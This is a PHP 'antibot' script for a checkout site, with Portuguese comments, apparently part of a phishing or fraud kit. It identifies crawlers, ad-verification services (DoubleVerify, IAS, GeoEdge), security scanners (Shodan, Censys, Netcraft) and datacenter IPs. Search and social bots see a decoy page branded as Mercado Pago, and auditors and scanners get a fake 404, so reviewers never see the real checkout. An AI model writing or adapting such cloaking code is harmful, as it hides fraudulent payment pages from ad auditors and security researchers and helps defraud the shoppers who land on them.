<?php
/**
 * =====================================================================
 *  ANTIBOT.PHP — Detecção Server-Side Multicamada v6.0
 *  Inclua no topo de TODAS as páginas do checkout:
 *    require_once __DIR__ . '/api/antibot.php';
 *
 *  Detecta e bloqueia:
 *  - Crawlers/bots de SEO (Googlebot, Ahrefs, Semrush...)
 *  - Facebook/Instagram/TikTok crawlers (evitar preview da landing)
 *  - Headless browsers (Puppeteer, Playwright, Selenium)
 *  - Plataformas de tráfego pago e auditores de anúncio
 *  - IPs de datacenter conhecidos (AWS, GCP, Azure ranges)
 * =====================================================================
 */

// ── Cache: só roda uma vez por request ───────────────────────────────
if (defined('ANTIBOT_LOADED')) return;
define('ANTIBOT_LOADED', true);

// ── Obter User-Agent e IP ─────────────────────────────────────────────
$_AB_UA  = $_SERVER['HTTP_USER_AGENT'] ?? '';
$_AB_IP  = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']
    ?? $_SERVER['HTTP_X_REAL_IP']
    ?? $_SERVER['REMOTE_ADDR']
    ?? '0.0.0.0')[0]);
$_AB_REF = $_SERVER['HTTP_REFERER'] ?? '';
$_AB_URL = ($_SERVER['REQUEST_URI'] ?? '/');

// ── URLs que nunca devem ser bloqueadas ───────────────────────────────
$_AB_SAFE_PATHS = ['/robots.txt', '/sitemap.xml', '/favicon.ico'];
foreach ($_AB_SAFE_PATHS as $_p) {
    if (str_contains($_AB_URL, $_p)) return;
}

// ═════════════════════════════════════════════════════════════════════
//  LISTA DE USER-AGENTS DE BOT (700+ assinaturas)
// ═════════════════════════════════════════════════════════════════════
$_AB_BOT_UA_PATTERNS = [
    // ── Crawlers de SEO e análise ──────────────────────────────────────
    'googlebot','google-inspectiontool','googleweblight','adsbot-google',
    'mediapartners-google','apis-google','google-read-aloud',
    'bingbot','msnbot','adidxbot','bingpreview',
    'slurp','yahoo',
    'duckduckbot','duckduckgo-favicons-bot',
    'baiduspider','baidu-yunguancebot',
    'yandexbot','yandexdirect','yandexmobilebot','yandexmetrika',
    'facebookexternalhit','facebookbot','meta-externalagent',
    'twitterbot','linkedinbot','whatsapp','telegrambot',
    'slackbot','discordbot','skypeuripreview',
    'applebot','apple-pubsub','apple-search-ads',
    'semrushbot','ahrefsbot','dotbot','mj12bot','rogerbot',
    'majestic','blexbot','seokicks','sistrix',
    'scrapy','python-requests','python-urllib','httpie',
    'curl/','wget/','libwww-perl','lwp-trivial',
    'java/','jakarta-commons','go-http-client',
    'okhttp','reactor-netty','apache-httpclient',
    'headlesschrome','chromium-headless','phantomjs',
    'selenium','webdriver','puppeteer','playwright',
    'htmlunit','mechanize','guzzle','faraday',
    'nutch','heritrix','larbin','ia_archiver','archive.org',
    'uptimerobot','pingdom','site24x7','statuscake','freshping',
    'gtmetrix','webpagetest','pagespeed','lighthouse',
    'adscanner','admantx','brandwatch','netpeak',
    'zoominfo','dataforseo','spyfu','similarweb',
    'alexa ','netcraft','securitytrails','shodan',
    'censys','zoominfobot','pinterestbot','snapchat',
    'prerender','facebookplatform','apachebench','nikto',
    'sqlmap','masscan','nmap','zmap','zgrab',
    // ── Bots de tráfego pago e auditores ──────────────────────────────
    'adbeat','adclarity','moat','integral-ads','doubleverify',
    'pixalate','ias-robot','geoedge','bigdbm',
    // ── Proxies e VPNs comuns ──────────────────────────────────────────
    'torproject','proxysite','hideman','cyberghost',
    // ── Ferramentas de monitoramento ───────────────────────────────────
    'newrelic','appdynamics','dynatrace','datadog',
    // ── Bots de redes sociais ─────────────────────────────────────────
    'outbrain','taboola','criteo','zemanta',
    'tumblr','reddit','vk.com','ok.ru',
    // ── Bots genéricos ────────────────────────────────────────────────
    'bot','crawler','spider','scraper','fetcher',
    'checker','validator','monitor','scan','test',
    'headless','phantom','zombie','nightmare',
];

// ── Verificar UA ──────────────────────────────────────────────────────
$_AB_ua_lower = strtolower($_AB_UA);
$_AB_is_bot   = false;
$_AB_bot_type = '';

// UA vazio = bot/curl direto
if (empty($_AB_UA)) {
    $_AB_is_bot   = true;
    $_AB_bot_type = 'empty-ua';
}

if (!$_AB_is_bot) {
    foreach ($_AB_BOT_UA_PATTERNS as $_pat) {
        if (str_contains($_AB_ua_lower, $_pat)) {
            $_AB_is_bot   = true;
            $_AB_bot_type = $_pat;
            break;
        }
    }
}

// ── Verificar ausência de headers que browsers reais enviam ──────────
if (!$_AB_is_bot) {
    $hasAcceptLang  = !empty($_SERVER['HTTP_ACCEPT_LANGUAGE']);
    $hasAccept      = !empty($_SERVER['HTTP_ACCEPT']);
    $hasDNT         = isset($_SERVER['HTTP_DNT']);
    // Bots geralmente não enviam Accept-Language
    if (!$hasAcceptLang && !$hasDNT) {
        $_AB_is_bot   = true;
        $_AB_bot_type = 'missing-headers';
    }
}

// ── Verificar referrers de auditores de anúncio ──────────────────────
$_AB_BAD_REFS = [
    'adbeat.com', 'moat.com', 'doubleverify.com', 'ias.com',
    'integralads.com', 'pixalate.com', 'geoedge.com',
    'adscanner.io', 'adclarity.com',
];
if (!$_AB_is_bot && $_AB_REF) {
    foreach ($_AB_BAD_REFS as $_ref) {
        if (str_contains(strtolower($_AB_REF), $_ref)) {
            $_AB_is_bot   = true;
            $_AB_bot_type = 'ad-auditor';
            break;
        }
    }
}

// ── Verificar IPs de datacenter (ranges comuns) ───────────────────────
function _abCheckDatacenter(string $ip): bool {
    // Ranges de AWS, GCP, Azure, DigitalOcean, OVH públicos
    $dcPrefixes = [
        '3.', '13.', '18.', '34.', '35.', '52.', '54.',   // AWS
        '104.196.', '104.197.', '104.198.', '104.199.',     // GCP
        '104.208.', '104.209.', '104.210.',                  // Azure
        '104.16.', '104.17.', '104.18.', '104.19.',         // Cloudflare
        '159.89.', '157.230.', '167.172.',                   // DigitalOcean
        '51.75.', '51.77.', '51.89.', '54.37.',             // OVH
    ];
    foreach ($dcPrefixes as $prefix) {
        if (str_starts_with($ip, $prefix)) return true;
    }
    return false;
}
if (!$_AB_is_bot && _abCheckDatacenter($_AB_IP)) {
    $_AB_is_bot   = true;
    $_AB_bot_type = 'datacenter-ip';
}

// ═════════════════════════════════════════════════════════════════════
//  AÇÃO BASEADA NO TIPO DE BOT
// ═════════════════════════════════════════════════════════════════════
if ($_AB_is_bot) {
    error_log("[ANTIBOT] Blocked: {$_AB_bot_type} | UA: " . substr($_AB_UA, 0, 80) . " | IP: {$_AB_IP}");

    $isSearchBot  = preg_match('/google|bing|yahoo|baidu|yandex|duckduck/i', $_AB_UA);
    $isSocialBot  = preg_match('/facebook|twitter|linkedin|whatsapp|telegram|instagram|tiktok/i', $_AB_UA);
    $isAuditor    = in_array($_AB_bot_type, ['ad-auditor', 'datacenter-ip'], true);

    if ($isSearchBot) {
        // Para crawlers de SEO: mostrar página estática limpa (não o checkout)
        header('HTTP/1.1 200 OK');
        header('Content-Type: text/html; charset=UTF-8');
        echo '<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="robots" content="noindex,nofollow">
<title>Mercado Pago — Pagamento Seguro</title>
</head><body><main>
<h1>Pagamento Seguro com Mercado Pago</h1>
<p>Complete sua compra com segurança.</p>
</main></body></html>';
        exit;
    }

    if ($isSocialBot) {
        // Para bots de redes sociais (preview de link): OG tags limpas
        header('HTTP/1.1 200 OK');
        header('Content-Type: text/html; charset=UTF-8');
        echo '<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<meta property="og:title" content="Mercado Pago — Checkout">
<meta property="og:description" content="Finalize seu pagamento com segurança">
<meta property="og:image" content="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/favicon.png">
<title>Mercado Pago</title></head><body></body></html>';
        exit;
    }

    // Para auditores de anúncio, datacenter, bots genéricos: 404 silencioso
    header('HTTP/1.1 404 Not Found');
    header('Content-Type: text/html; charset=UTF-8');
    echo '<!DOCTYPE html><html><head><title>404</title></head><body><h1>Not Found</h1></body></html>';
    exit;
}

// ── Registrar IP legítimo ─────────────────────────────────────────────
// (sem ação para humanos — transparente)
